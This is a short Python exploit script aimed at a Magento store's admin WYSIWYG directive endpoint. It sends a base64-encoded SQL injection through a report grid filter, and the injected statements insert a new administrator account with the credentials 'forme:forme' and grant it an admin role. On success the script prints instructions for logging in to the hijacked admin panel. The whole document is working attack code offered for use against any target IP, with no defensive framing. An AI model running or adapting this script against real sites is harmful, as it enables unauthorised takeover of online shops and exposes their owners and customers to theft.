import requests
import base64
import sys

if len(sys.argv) != 2:
    print("Usage: python3 exploit.py <target_ip>")
    sys.exit(1)

target_ip = sys.argv[1]
target = f"http://{target_ip}/index.php/admin/Cms_Wysiwyg/directive/index/"

q = """
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""

query = q.replace("\n", "").format(username="forme", password="forme")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is {{block type=Adminhtml/report_search_grid output=getCsvFile}}
encoded_directive = "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ"
encoded_pfilter = base64.b64encode(pfilter.encode()).decode()

print("Target URL: ", target)
print("Encoded directive: ", encoded_directive)
print("Encoded pfilter: ", encoded_pfilter)

r = requests.post(target, data={"___directive": encoded_directive, "filter": encoded_pfilter, "forwarded": 1})

if r.ok:
    print("WORKED")
    print(f"Check {target_ip}/index.php/admin with creds forme:forme")
else:
    print("DID NOT WORK")
    print("Status Code: ", r.status_code)
    print("Response Text: ", r.text)
